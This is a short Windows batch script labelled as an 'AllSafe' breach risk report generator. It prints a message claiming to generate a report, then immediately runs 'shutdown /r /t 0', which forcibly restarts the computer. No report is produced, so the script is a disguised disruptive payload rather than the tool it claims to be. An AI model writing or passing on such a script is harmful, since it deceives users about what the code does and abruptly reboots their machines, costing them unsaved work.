@echo off
rem AllSafe risk report generator (windows)
echo generating full breach risk report...
shutdown /r /t 0
